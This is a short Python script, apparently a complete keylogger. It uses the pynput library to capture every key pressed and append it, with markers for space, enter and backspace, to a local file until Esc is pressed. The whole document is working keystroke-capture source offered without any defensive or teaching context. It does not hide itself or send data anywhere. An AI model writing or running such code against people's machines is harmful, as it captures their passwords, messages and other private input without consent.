from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "key_log.txt"

# Function to log the keys
def on_press(key):
    # Open the log file in append mode
    with open(log_file, "a") as f:
        try:
            # Write the character of the key pressed
            f.write(f"{key.char}")
        except AttributeError:
            # Handle special keys like Enter, Space, etc.
            if key == Key.space:
                f.write(" [SPACE] ")
            elif key == Key.enter:
                f.write(" [ENTER]\n")
            elif key == Key.backspace:
                f.write(" [BACKSPACE] ")
            else:
                f.write(f" [{key}] ")

# Function to stop logging (press Esc to stop)
def on_release(key):
    if key == Key.esc:
        # Stop listener when 'esc' key is pressed
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
